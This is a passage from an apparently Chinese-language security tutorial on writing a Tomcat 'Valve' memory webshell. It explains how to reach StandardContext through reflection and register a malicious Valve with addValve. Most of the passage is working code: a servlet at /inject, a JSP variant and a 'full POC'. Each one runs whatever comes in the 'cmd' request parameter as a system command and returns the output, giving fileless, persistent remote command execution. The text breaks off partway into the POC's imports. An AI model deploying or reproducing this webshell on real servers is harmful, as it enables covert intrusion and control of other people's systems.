+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Valve 被成功调用&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
+
+<p>我们还需要通过 <code>addValve()</code> 方法把它添加进去，不然的话这个 Valve 肯定是白写的</p>
+</li>
+<li><p>前面我们提到了在 <code>Pipeline</code> 接口当中存在 <code>addValve()</code> 方法我们可以通过这个方法把 Valve 添加进去</p>
+<p><code>addValve()</code> 方法对应的实现类是 <code>StandardPipeline</code>，但是我们是无法直接获取到 <code>StandardPipeline</code> 的，所以这里去找一找 <code>StandardContext</code> 有没有获取到 <code>StandardPipeline</code> 的手段。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260414204522561.png" srcset="/img/loading.gif" lazyload alt="image-20260414204522401"></p>
+</li>
+<li><p>搜索<code>Pipeline()</code>刚好有<code>getPipeline()</code></p>
+<p>进去看看</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260414204609492.png" srcset="/img/loading.gif" lazyload alt="image-20260414204609340"></p>
+<p>这里写着 return 一个 Pipeline 类型的类，它是用来管理 Valves 的</p>
+<p>所以 <code>standradContext.getPipeline</code> 获取 <code>StandardPipeline</code></p>
+</li>
+<li><p>根据上文的分析我们能够总结出Valve型内存马的注入思路</p>
+<ol>
+<li>获取<code>StandardContext</code>对象</li>
+<li>通过<code>StandardContext</code>对象获取<code>StandardPipeline</code></li>
+<li>编写恶意Valve</li>
+<li>通过<code>StandardPipeline.addValve()</code>动态添加Valve</li>
+</ol>
+</li>
+</ul>
+<blockquote>
+<p>问题：</p>
+<p>我们的 Valve 是应该放到 Filter，Listener，还是 Servlet 里面？？？</p>
+<p>其实哪个都可以。因为我们的主要目的都是为了得到<code>StandardContext.getPipeline().addValve()</code> 这一行代码。</p>
+<p>但是，主要区别就是我们选取不同载体，获取<code>StandardContext</code>的难度不同     <strong>Servlet 最简单</strong>能让你用最少的代码把 Valve 挂上去。</p>
+<p>而且我们挂载的层级不同，危害就不同（Valve 的威力，取决于你把它挂在哪个<strong>“容器”</strong>的管道（Pipeline）上。）</p>
+<ul>
+<li><strong>Engine 级</strong>：最高层。挂在这里，这台服务器上所有的域名、所有的网站都会被拦截。</li>
+<li><strong>Host 级</strong>：域名层。挂在这里，这个域名下的所有应用（比如 <code>blog.com/app1</code> 和 <code>blog.com/app2</code>）都会被拦截。</li>
+<li><strong>Context 级</strong>：应用层。挂在这里，只有当前的网站应用（比如 <code>/app1</code>）会被拦截。</li>
+</ul>
+<p>所以综上：所以我们通过 Servlet 来加载。</p>
+</blockquote>
+<h1 id="Valve-内存马的EXP编写"><a href="#Valve-内存马的EXP编写" class="headerlink" title="Valve 内存马的EXP编写"></a>Valve 内存马的EXP编写</h1><h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><ul>
+<li><p>先定义一个 <code>doGet()</code> 方法，因为我们是发出 GET 请求的，通过 <code>doGet()</code> 方法获取到 request 对象。</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #FFFFFF">V</span><span style="color: #C678DD">alue</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.catalina.connector.Request</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.catalina.connector.Response</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.catalina.core.StandardContext</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.catalina.valves.ValveBase</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.ServletException</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.http.HttpServlet</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.http.HttpServletRequest</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.http.HttpServletResponse</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.io.IOException</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.lang.reflect.Field</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">javax.servlet.annotation.WebServlet</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/inject&quot;</span><span style="color: #E06C75">) </span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ValveShell_Servlet</span><span style="color: #E06C75"> </span><span style="color: #C678DD">extends</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">HttpServlet</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">protected</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> doGet</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">HttpServletRequest</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">req</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">HttpServletResponse</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">resp</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ServletException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">try</span><span style="color: #ABB2BF"> {</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #7F848E; font-style: italic">// 1. 反射获取 StandardContext</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #7F848E; font-style: italic">// 注意：RequestFacade -&gt; Request -&gt; StandardContext</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">Field</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">connectorReqField</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">req</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;request&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">connectorReqField</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">Request</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">connectorReq</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (Request) </span><span style="color: #E5C07B">connectorReqField</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(req);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">StandardContext</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">standardContext</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (StandardContext) </span><span style="color: #E5C07B">connectorReq</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getContext</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #7F848E; font-style: italic">// 2. 注入 Valve</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">standardContext</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getPipeline</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">addValve</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ValveBase</span><span style="color: #ABB2BF">() {</span></span>
+<span class="line"><span style="color: #ABB2BF">                @</span><span style="color: #E5C07B">Override</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> invoke</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Request</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">request</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Response</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">response</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ServletException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">cmd</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">request</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getParameter</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;cmd&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (cmd </span><span style="color: #56B6C2">!=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">!</span><span style="color: #E5C07B">cmd</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">isEmpty</span><span style="color: #ABB2BF">()) {</span></span>
+<span class="line"><span style="color: #ABB2BF">                        </span><span style="color: #7F848E; font-style: italic">// 执行命令</span></span>
+<span class="line"><span style="color: #ABB2BF">                        </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75">result</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">1024</span><span style="color: #ABB2BF">];</span></span>
+<span class="line"><span style="color: #ABB2BF">                        </span><span style="color: #E5C07B">Process</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">process</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getRuntime</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">exec</span><span style="color: #ABB2BF">(cmd);</span></span>
+<span class="line"><span style="color: #ABB2BF">                        </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">len</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">process</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInputStream</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">read</span><span style="color: #ABB2BF">(result);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">                        </span><span style="color: #7F848E; font-style: italic">// 直接回显给浏览器</span></span>
+<span class="line"><span style="color: #ABB2BF">                        </span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getWriter</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">write</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">String</span><span style="color: #ABB2BF">(result, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, len));</span></span>
+<span class="line"><span style="color: #ABB2BF">                        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF">; </span><span style="color: #7F848E; font-style: italic">// 匹配到命令，处理完直接返回，不走后面的逻辑了</span></span>
+<span class="line"><span style="color: #ABB2BF">                    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #7F848E; font-style: italic">// 关键！！如果没有命令，必须把请求交给下一个 Valve</span></span>
+<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #7F848E; font-style: italic">// 否则你的网站就挂了</span></span>
+<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #61AFEF">getNext</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">invoke</span><span style="color: #ABB2BF">(request, response);</span></span>
+<span class="line"><span style="color: #ABB2BF">                }</span></span>
+<span class="line"><span style="color: #ABB2BF">            });</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">resp</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getWriter</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">write</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Inject Success! Try ?cmd=whoami&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        } </span><span style="color: #C678DD">catch</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">Exception</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">e</span><span style="color: #ABB2BF">) {</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">e</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">printStackTrace</span><span style="color: #ABB2BF">(); </span><span style="color: #7F848E; font-style: italic">// 调试用，看看哪里报错</span></span>
+<span class="line"><span style="color: #ABB2BF">        }</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
+
+<p>到我们 <code>ValveBase</code> 这个子类里面去，编写我们的恶意代码。</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #FFFFFF">V</span><span style="color: #C678DD">alue</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.catalina.connector.Request</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.catalina.connector.Response</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.catalina.valves.ValveBase</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.ServletException</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.io.IOException</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ValveShell</span><span style="color: #E06C75"> </span><span style="color: #C678DD">extends</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ValveBase</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> invoke</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Request</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">request</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Response</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">response</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ServletException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;111&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">try</span><span style="color: #ABB2BF"> {</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getRuntime</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">exec</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">request</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getParameter</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;cmd&quot;</span><span style="color: #ABB2BF">));</span></span>
+<span class="line"><span style="color: #ABB2BF">        } </span><span style="color: #C678DD">catch</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">Exception</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">e</span><span style="color: #ABB2BF">) {</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">        }</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260414212627373.png" srcset="/img/loading.gif" lazyload alt="image-20260414212627332"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260414212639355.png" srcset="/img/loading.gif" lazyload alt="image-20260414212639316"></p>
+</li>
+</ul>
+<h2 id="jsp"><a href="#jsp" class="headerlink" title="jsp"></a>jsp</h2><ul>
+<li><p>获取StandardPipeline对象</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #56B6C2">&lt;%</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Field</span><span style="color: #E06C75"> reqF </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">request</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;request&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">reqF</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Request</span><span style="color: #E06C75"> req </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (Request) </span><span style="color: #E5C07B">reqF</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(request);</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">StandardContext</span><span style="color: #E06C75"> standardContext </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (StandardContext) </span><span style="color: #E5C07B">req</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getContext</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #E06C75"> </span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Pipeline</span><span style="color: #E06C75"> pipeline </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">standardContext</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getPipeline</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #56B6C2">%&gt;</span></span></code></pre></div></div></figure>
+</li>
+<li><p>编写恶意Valve类</p>
+<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">&lt;%!</span></span>
+<span class="line"><span style="color: #abb2bf">    class Shell_Valve extends ValveBase {</span></span>
+<span class="line"><span style="color: #abb2bf"> </span></span>
+<span class="line"><span style="color: #abb2bf">        @Override</span></span>
+<span class="line"><span style="color: #abb2bf">        public void invoke(Request request, Response response) throws IOException, ServletException {</span></span>
+<span class="line"><span style="color: #abb2bf">            String cmd = request.getParameter(&quot;cmd&quot;);</span></span>
+<span class="line"><span style="color: #abb2bf">            if (cmd !=null){</span></span>
+<span class="line"><span style="color: #abb2bf">                try{</span></span>
+<span class="line"><span style="color: #abb2bf">                    Runtime.getRuntime().exec(cmd);</span></span>
+<span class="line"><span style="color: #abb2bf">                }catch (IOException e){</span></span>
+<span class="line"><span style="color: #abb2bf">                    e.printStackTrace();</span></span>
+<span class="line"><span style="color: #abb2bf">                }catch (NullPointerException n){</span></span>
+<span class="line"><span style="color: #abb2bf">                    n.printStackTrace();</span></span>
+<span class="line"><span style="color: #abb2bf">                }</span></span>
+<span class="line"><span style="color: #abb2bf">            }</span></span>
+<span class="line"><span style="color: #abb2bf">        }</span></span>
+<span class="line"><span style="color: #abb2bf">    }</span></span>
+<span class="line"><span style="color: #abb2bf">%&gt;</span></span></code></pre></div></div></figure>
+</li>
+<li><p>将恶意Valve添加进StandardPipeline</p>
+<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">&lt;%</span></span>
+<span class="line"><span style="color: #abb2bf">    Shell_Valve shell_valve = new Shell_Valve();</span></span>
+<span class="line"><span style="color: #abb2bf">    pipeline.addValve(shell_valve);</span></span>
+<span class="line"><span style="color: #abb2bf">%&gt;</span></span></code></pre></div></div></figure>
+</li>
+<li><p>完整POC</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">page</span><span style="color: #E06C75"> import</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;java.lang.reflect.Field&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">%&gt;</span></span>
+<span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">page</span><span style="color: #E06C75"> import</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;org.apache.catalina.core.StandardContext&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">%&gt;</span></span>
+<span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">page</span><span style="color: #E06C75"> import</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;org.apache.catalina.connector.Request&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">%&gt;</span></span>
+<span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">page</span><span style="color: #E06C75"> import</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;org.apache.catalina.Pipeline&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">%&gt;</span></span>
+<span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">page</span><span style="color: #E06C75"> import</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;org.apache.catalina.valves.ValveBase&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">%&gt;</span></span>
